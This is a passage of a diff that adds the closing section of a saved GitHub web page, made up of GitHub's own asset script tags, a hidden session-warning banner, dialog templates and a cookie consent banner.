+      <script crossorigin="anonymous" async="async" integrity="sha512-mGhHrE0HJ7vEibXJt/Agfu9Gd7z9PpvEiRthudiS5f0WZMyO6PvVmdN9pVZsQEybIa4wKuiSeHBh5LGE/AqKwg==" type="application/javascript" data-module-id="./randomColor.js" data-src="https://github.githubassets.com/assets/randomColor-986847ac.js"></script>
+      <script crossorigin="anonymous" async="async" integrity="sha512-PulklwTNjJArlDqvCysC0AKYETVeAa1gJlPSSwR/CinO1u09p8B8vtwVwiTdeutKpU7PP0cWWxuFDOZcdor/Ww==" type="application/javascript" data-module-id="./sortable-behavior.js" data-src="https://github.githubassets.com/assets/sortable-behavior-3ee96497.js"></script>
+      <script crossorigin="anonymous" async="async" integrity="sha512-tivtbSQPkxNrK2SWvxwouEUSEPrjFMxk5qbZHCeDzaJE1oi3cc2a+iAr3stKZdWYnIFRgWmOImn8k5+MyPZUEg==" type="application/javascript" data-module-id="./tweetsodium.js" data-src="https://github.githubassets.com/assets/tweetsodium-b62bed6d.js"></script>
+      <script crossorigin="anonymous" async="async" integrity="sha512-R7q4jNJ4vUxWi/Ow35zhtKpH2UVfGY/drFzWaBPwlCuXz1v8jFTDbT6R7+zbG3ycajaKSxPxhSNPT69QjmY8XA==" type="application/javascript" data-module-id="./user-status-submit.js" data-src="https://github.githubassets.com/assets/user-status-submit-47bab88c.js"></script>
+      <script crossorigin="anonymous" async="async" integrity="sha512-rl10V94Lnkk6i/Ydlcia8DeugwAEJc/9WKNCbM+PTJLzrcHsor8f6nIccSWOvXQOBlPI/tIb2TbGG86W0R5jUA==" type="application/javascript" src="https://github.githubassets.com/assets/gist-ae5d7457.js"></script>
+
+    
+  <div class="js-stale-session-flash flash flash-warn flash-banner" hidden
+    >
+    <svg class="octicon octicon-alert" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8.22 1.754a.25.25 0 00-.44 0L1.698 13.132a.25.25 0 00.22.368h12.164a.25.25 0 00.22-.368L8.22 1.754zm-1.763-.707c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0114.082 15H1.918a1.75 1.75 0 01-1.543-2.575L6.457 1.047zM9 11a1 1 0 11-2 0 1 1 0 012 0zm-.25-5.25a.75.75 0 00-1.5 0v2.5a.75.75 0 001.5 0v-2.5z"></path></svg>
+    <span class="js-stale-session-flash-signed-in" hidden>You signed in with another tab or window. <a href="">Reload</a> to refresh your session.</span>
+    <span class="js-stale-session-flash-signed-out" hidden>You signed out in another tab or window. <a href="">Reload</a> to refresh your session.</span>
+  </div>
+  <template id="site-details-dialog">
+  <details class="details-reset details-overlay details-overlay-dark lh-default text-gray-dark hx_rsm" open>
+    <summary role="button" aria-label="Close dialog"></summary>
+    <details-dialog class="Box Box--overlay d-flex flex-column anim-fade-in fast hx_rsm-dialog hx_rsm-modal">
+      <button class="Box-btn-octicon m-0 btn-octicon position-absolute right-0 top-0" type="button" aria-label="Close dialog" data-close-dialog>
+        <svg class="octicon octicon-x" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M3.72 3.72a.75.75 0 011.06 0L8 6.94l3.22-3.22a.75.75 0 111.06 1.06L9.06 8l3.22 3.22a.75.75 0 11-1.06 1.06L8 9.06l-3.22 3.22a.75.75 0 01-1.06-1.06L6.94 8 3.72 4.78a.75.75 0 010-1.06z"></path></svg>
+      </button>
+      <div class="octocat-spinner my-6 js-details-dialog-spinner"></div>
+    </details-dialog>
+  </details>
+</template>
+
+  <div class="Popover js-hovercard-content position-absolute" style="display: none; outline: none;" tabindex="0">
+  <div class="Popover-message Popover-message--bottom-left Popover-message--large Box box-shadow-large" style="width:360px;">
+  </div>
+</div>
+
+    <div class="js-cookie-consent-banner" hidden>
+  <div class="hx_cookie-banner p-2 p-sm-3 p-md-4">
+    <div style="max-width: 1194px;" class="Box hx_cookie-banner-box box-shadow-medium mx-auto">
+    <div class="Box-body border-0 py-0 px-3 px-md-4">
+      <div class="js-main-cookie-banner hx_cookie-banner-main">
+          <div class="d-md-flex flex-items-center py-3">
+            <p class="f5 flex-1 mb-3 mb-md-0">
+              
+  We use <span class="text-bold">optional</span> third-party analytics cookies to understand how you use GitHub.com so we can build better products.
+
+              <span class="btn-link js-cookie-consent-learn-more">Learn more</span>.
+            </p>
+            <div class="d-flex d-md-block flex-wrap flex-sm-nowrap">
+              <button class="btn btn-outline flex-1 mr-1 mx-sm-1 m-md-0 ml-md-2 js-cookie-consent-accept">Accept</button>
+              <button class="btn btn-outline flex-1 ml-1 m-md-0 ml-md-2 js-cookie-consent-reject">Reject</button>
+            </div>
+          </div>
+        </div>
+
+        <div class="js-cookie-details hx_cookie-banner-details" hidden>
+          <div class="d-md-flex flex-items-center py-3">
+            <p class="f5 flex-1 mb-2 mb-md-0">
+              
+  We use <span class="text-bold">optional</span> third-party analytics cookies to understand how you use GitHub.com so we can build better products.
+
+              <br>
+              You can always update your selection by clicking <span class="text-bold">Cookie Preferences</span> at the bottom of the page.
+              For more information, see our <a href="https://docs.github.com/en/free-pro-team@latest/github/site-policy/github-privacy-statement">Privacy Statement</a>.
+            </p>
+          </div>
+
+          <div class="d-md-flex flex-items-center py-3 border-top">
+            <div class="f5 flex-1 mb-2 mb-md-0">
+              <h5 class="mb-1">Essential cookies</h5>
+              <p class="f6 mb-md-0">We use essential cookies to perform essential website functions, e.g. they're used to log you in. 
+                <a href="https://docs.github.com/en/github/site-policy/github-subprocessors-and-cookies">Learn more</a>
+              </p>
+            </div>
+            <div class="text-right">
+              <h5 class="text-blue">Always active</h5>
+            </div>
+          </div>
+
+          <div class="d-md-flex flex-items-center py-3 border-top">
+            <div class="f5 flex-1 mb-2 mb-md-0">
+              <h5 class="mb-1">Analytics cookies</h5>
+              <p class="f6 mb-md-0">We use analytics cookies to understand how you use our websites so we can make them better, e.g. they're used to gather information about the pages you visit and how many clicks you need to accomplish a task. 
+                <a href="https://docs.github.com/en/github/site-policy/github-subprocessors-and-cookies">Learn more</a>
+              </p>
+            </div>
+            <div class="text-right">
+              <div class="BtnGroup mt-1 mt-md-0 ml-2">
+                <button class="btn btn-outline BtnGroup-item js-accept-analytics-cookies" type="button">Accept</button>
+                <button class="btn btn-outline BtnGroup-item js-reject-analytics-cookies" type="button">Reject</button>
+              </div>
+            </div>
+          </div>
+
+          <div class="text-right py-3 border-top">
+            <button class="btn btn-primary js-save-cookie-preferences" type="button" disabled>Save preferences</button>
+          </div>
+        </div>
+</div></div>  </div>
+</div>
+
+
+  </body>
+</html>
+
